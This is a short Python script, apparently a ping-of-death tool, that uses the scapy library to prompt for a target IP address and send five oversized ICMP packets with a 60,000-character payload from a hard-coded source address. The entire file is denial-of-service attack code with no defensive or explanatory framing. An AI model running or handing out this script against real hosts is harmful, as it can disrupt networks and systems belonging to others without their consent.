from scapy.all import *

ip = input("IP: ")

# Change according with your IP addresses
SOURCE_IP="192.168.2.102"
TARGET_IP=ip
MESSAGE="T"
NUMBER_PACKETS=5 # Number of pings

pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
send(NUMBER_PACKETS*pingOFDeath)
